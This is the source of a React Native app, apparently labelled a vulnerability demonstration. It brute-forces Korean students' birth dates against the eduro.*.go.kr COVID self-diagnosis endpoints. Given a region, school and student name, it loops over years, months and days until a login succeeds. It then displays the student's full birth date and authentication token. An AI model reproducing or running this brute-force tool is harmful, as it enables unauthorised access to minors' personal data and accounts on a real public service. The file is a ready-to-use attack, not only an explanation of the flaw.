import { StatusBar } from 'expo-status-bar'
import React from 'react'
import { StyleSheet, Text, View, Image, ToastAndroid, FlatList } from 'react-native'
import { TextInput, Button, Card, Portal, Dialog, Paragraph, Provider, List } from 'react-native-paper'
import DropDownPicker from "react-native-dropdown-picker"
import Axios, { AxiosResponse } from "axios"

interface states {
  Locale: string
  StudentName: string
  SchoolName: string
  BirthYear: string
  isLoading: boolean
  Students: Array<StudentInfo>
  ShowingModal: boolean
  detailSchools:Array<SchoolDetail>
  ShowingModal_SelectSchool:boolean
  onSelectDetailSchool:(Item:SchoolDetail) => void
}

interface StudentInfo {
  Name: string,
  Birthday: string,
  SchoolName:string,
  Token: string
}

interface SchoolDetail{
  Name:string,
  Code:string
}

export default class App extends React.Component<any, states>{
  componentWillMount() {
    this.setState({
      Locale: "",
      StudentName: "",
      SchoolName: "",
      BirthYear: "",
      isLoading: false,
      Students: [],
      ShowingModal: false,
      ShowingModal_SelectSchool:false,
      detailSchools:[]
    })
  }

  render() {
    return (
      <Provider>
        <View style={styles.container}>
          <Image style={{ height: "100%", width: "100%", position: "absolute" }} blurRadius={3} source={require("./assets/background.jpg")}></Image>
          <Card style={{ paddingHorizontal: 15, paddingVertical: 15, marginHorizontal: 20 }}>
            <Card.Title style={{ paddingLeft: 0, marginBottom: 15 }} title="자가진단 취약점 시연도구" subtitle="https://github.com/VINTO1819"></Card.Title>
            <DropDownPicker
              placeholder={"지역*"}
              onChangeItem={(value) => this.setState({ Locale: value.value })}
              items={[
                { label: '서울', value: 'sen' },
                { label: '부산', value: 'pen' },
                { label: '대구', value: 'dge' },
                { label: '인천', value: 'ice' },
                { label: '광주', value: 'gen' },
                { label: '대전', value: 'dje' },
                { label: '울산', value: 'use' },
                { label: '세종', value: 'sje' },
                { label: '경기', value: 'goe' },
                { label: '강원', value: 'kwe' },
                { label: '충북', value: 'cbe' },
                { label: '충남', value: 'cne' },
                { label: '전북', value: 'jbe' },
                { label: '전남', value: 'jne' },
                { label: '경북', value: 'gbe' },
                { label: '경남', value: 'gne' },
                { label: '제주', value: 'jje' }
              ]}
            />

            <TextInput
              label="학교 이름*"
              style={{ height: 50, marginVertical: 10 }}
              value={this.state.SchoolName}
              onChangeText={text => this.setState({ SchoolName: text })}
            />

            <TextInput
              label="학생 이름*"
              style={{ height: 50, marginVertical: 10 }}
              value={this.state.StudentName}
              onChangeText={text => this.setState({ StudentName: text })}
            />

            <TextInput
              label="태어난 년도 두자리"
              style={{ height: 50, marginVertical: 10 }}
              value={this.state.BirthYear}
              onChangeText={text => this.setState({ BirthYear: text })}
            />

            <Button loading={this.state.isLoading} mode="contained" onPress={() => {
              if (this.state.Locale != "" && this.state.SchoolName != "" && this.state.StudentName != "" && this.state.isLoading == false) {
                this.setState({ isLoading: true }); this.Hackit(this.state.Locale, this.state.StudentName, this.state.SchoolName, this.state.BirthYear)
              } else { ToastAndroid.show("*가 표시된 칸을 모두 채워주세요", ToastAndroid.SHORT) }
            }} style={{ marginVertical: 5 }}>
              검색 시작
            </Button>
            <Button mode="contained" onPress={() => { this.setState({ ShowingModal: true }) }} style={{ marginVertical: 5 }}>
              이전 결과 보기
            </Button>

          </Card>

          <Portal>
            <Dialog visible={this.state.ShowingModal} onDismiss={() => { this.setState({ ShowingModal: false }) }} style={{height:"70%", display:"flex"}}>
              <Dialog.Title>실시간 결과 / 기록</Dialog.Title>
              <Dialog.Content style={{flex:1}}>

              <FlatList<StudentInfo>
                  keyExtractor={(item, index) => item.Name}
                  renderItem={({ item }) => <List.Item title={`${item.Name} [${item.SchoolName}]`} description={`토큰 : ${item.Token}\n생년월일 : ${item.Birthday}`} />}
                  data={this.state.Students}
                  style={{height:"100%", width:"100%"}}
              />

              </Dialog.Content>
              <Dialog.Actions>
                <Button onPress={() => { this.setState({ Students: [] }) }}>Reset</Button>
                <Button onPress={() => { this.setState({ ShowingModal: false }) }}>Close</Button>
              </Dialog.Actions>
            </Dialog>
          </Portal>

          <Portal>
            <Dialog visible={this.state.ShowingModal_SelectSchool} style={{height:"70%", display:"flex"}}>
              <Dialog.Title>학교를 선택하세요</Dialog.Title>
              <Dialog.Content style={{flex:1}}>

              <FlatList<SchoolDetail>
                  keyExtractor={(item, index) => item.Name}
                  renderItem={({ item }) => <List.Item title={`${item.Name}`} description={item.Code} onPress={() => {
                    this.state.onSelectDetailSchool(item)
                    this.setState({ShowingModal_SelectSchool:false})
                  }}/>}
                  data={this.state.detailSchools}
                  style={{height:"100%", width:"100%"}}
              />

              </Dialog.Content>
            </Dialog>
          </Portal>

          <StatusBar style="auto" />
        </View>
      </Provider>
    )
  }

  async Hackit(Locale: string, StudentName: string, SchoolName: string, BirthYear: string) {
    const BaseUrl = `https://eduro.${Locale}.go.kr`
    await Axios({
      headers: {
        "accept": 'application/json'
      },
      method: "POST",
      url: `${BaseUrl}/stv_cvd_co00_004.do`,
      params: { schulNm: SchoolName }
    }).then(async (SchoolData) => {
      if (SchoolData.data.resultSVO.rtnRsltCode == "SUCCESS") { //학교 ID 추출 성공시
        if(SchoolData.data.resultSVO.schulCode == "" || SchoolData.data.resultSVO.schulNm == ""){
          await Axios({
            method: "GET",
            url: `${BaseUrl}/stv_cvd_co00_003.do`,
            params: { schulNm: SchoolName }
          }).then((DetailSchoolData) => {
            this.setState({detailSchools:this.getSchools(DetailSchoolData), ShowingModal_SelectSchool:true})
            this.setState({onSelectDetailSchool:(Item:SchoolDetail) => {
              if (BirthYear != "") { this.hack(SchoolData.data.resultSVO.schulNm, SchoolData.data.resultSVO.schulCode, StudentName, BirthYear, BaseUrl) } else {
                for (var Year = 1; Year <= 2014; Year++) {
                  var FormatYear = (Year.toString().length == 1) ? ("0" + Year.toString()).slice(-2) : Year.toString()
                  this.hack(Item.Name, Item.Code, StudentName, FormatYear, BaseUrl)
                }
              }
            }})
          })
        }else{

          if (BirthYear != "") { this.hack(SchoolData.data.resultSVO.schulNm, SchoolData.data.resultSVO.schulCode, StudentName, BirthYear, BaseUrl) } else {
            for (var Year = 1; Year <= 2014; Year++) {
              var FormatYear = (Year.toString().length == 1) ? ("0" + Year.toString()).slice(-2) : Year.toString()
              this.hack(SchoolData.data.resultSVO.schulNm, SchoolData.data.resultSVO.schulCode, StudentName, FormatYear, BaseUrl)
            }
          }

        }
      } else { //학교가 나오지 않을 경우

        await Axios({ //상세 리스트로 구하기
          method: "GET",
          url: `${BaseUrl}/stv_cvd_co00_003.do`,
          params: { schulNm: SchoolName }
        }).then((DetailSchoolData) => {
          const Schools = this.getSchools(DetailSchoolData)
          console.log("학교 리스트")
          console.log(Schools)
          if(Schools.length == 0){ //학교가 전혀 없다면
            ToastAndroid.show("찾을 수 없는 학교입니다.", ToastAndroid.SHORT)
            this.setState({ isLoading: false })
            return
          }
          this.setState({detailSchools:this.getSchools(DetailSchoolData), ShowingModal_SelectSchool:true})
          this.setState({onSelectDetailSchool:(Item:SchoolDetail) => {
            if (BirthYear != "") { this.hack(SchoolData.data.resultSVO.schulNm, SchoolData.data.resultSVO.schulCode, StudentName, BirthYear, BaseUrl) } else {
              for (var Year = 1; Year <= 2014; Year++) {
                var FormatYear = (Year.toString().length == 1) ? ("0" + Year.toString()).slice(-2) : Year.toString()
                this.hack(Item.Name, Item.Code, StudentName, FormatYear, BaseUrl)
              }
            }
          }})
        })

      }
    }).catch((err) => ToastAndroid.show(`오류 : ${err}`, ToastAndroid.SHORT))
  }

  getSchools(DetailSchoolData:AxiosResponse):Array<SchoolDetail>{
    const DOMParser = require("react-native-html-parser").DOMParser
    const Html = new DOMParser().parseFromString(DetailSchoolData.data, "text/html")
    console.log(Html.querySelectorAll("a[href='#']"))
    var DetailSchoolList:Array<SchoolDetail> = []
    Html.querySelectorAll("a[href=#]").forEach((item:any) => {
      console.log(item.rawText)
      DetailSchoolList.push({Name:item.text, Code:item.attributes["onclick"].replace("javscript:selectSchul('", "").replace(`, '${item.text}');`, "")})
    })
    return DetailSchoolList
  }


  hack(SchoolName: string, SchoolCode:string, StudentName: string, Year: string, BaseUrl: string) {
    for (var Month = 1; Month <= 12; Month++) {
      var FormatMonth = (Month.toString().length == 1) ? ("0" + Month.toString()).slice(-2) : Month.toString()
      for (var Day = 1; Day <= 32; Day++) {
        var FormatDay = (Day.toString().length == 1) ? ("0" + Day.toString()).slice(-2) : Day.toString()
        const BruteforceData = {
          qstnCrtfcNoEncpt: "",
          rtnRsltCode: "",
          schulCode: SchoolCode,
          schulNm: SchoolName,
          pName: StudentName,
          aditCrtfcNo: "",
          frnoRidno: Year + FormatMonth + FormatDay
        }

        Axios({
          headers: {
            "accept": 'application/json'
          },
          url: `${BaseUrl}/stv_cvd_co00_012.do`,
          method: "POST",
          params: BruteforceData
        }).then((RawData) => {
          if (RawData.data.resultSVO.data.rtnRsltCode == "SUCCESS") {
            const Data = RawData.data.resultSVO.data
            this.setState({isLoading:false, ShowingModal:true})
            ToastAndroid.show("목표를 찾았습니다", ToastAndroid.LONG)
            this.setState({
              Students: this.state.Students.concat([{
                Name: Data.pName,
                Birthday: Data.frnoRidno,
                SchoolName:SchoolName,
                Token: Data.qstnCrtfcNoEncpt
              }])
            })

          }
        })

      }
    }
  }



}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#fff',
    justifyContent: 'center',
    overflow: "scroll",
  },
})
